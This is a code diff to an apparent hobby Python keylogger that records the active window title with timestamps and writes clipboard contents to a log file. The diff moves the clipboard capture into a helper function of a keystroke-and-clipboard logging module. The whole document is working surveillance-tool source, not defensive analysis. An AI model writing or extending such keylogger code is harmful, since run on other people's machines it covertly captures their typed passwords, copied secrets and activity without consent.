@@ -11,7 +11,6 @@ import keystrokes_and_clipboard_logger
 import os
 import datetime
 import keyboard as kb
-import win32clipboard
 
 event_string = ''
 # Hieronder de relevante code
@@ -25,7 +24,8 @@ def main():
         f.write("======================================================" + "\n")
         keylogger = keystrokes_and_clipboard_logger.Keylogger()
         last_window_title = None
-        new_clipboard_data = None
+        new_clipboard = None
+        old_clipboard = None
 
         # TECHNICAL DEBT: Currently does not save the logged keys from the last opened application.
         # This happens because data does not get saved until the previous window != current active windows.
@@ -43,13 +43,7 @@ def main():
                 f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
             last_window_title = active_window_title
 
-            win32clipboard.OpenClipboard()
-            if old_clipboard_data != new_clipboard_data and new_clipboard_data is not None:
-                f.write(f"CLIPBOARD DATA: {new_clipboard_data} \n")
-            old_clipboard_data = new_clipboard_data.copy()
-            new_clipboard_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-
+            old_clipboard,new_clipboard = keystrokes_and_clipboard_logger.copy_clipboard(f, old_clipboard, new_clipboard)
 
 if __name__ == '__main__':
     main()
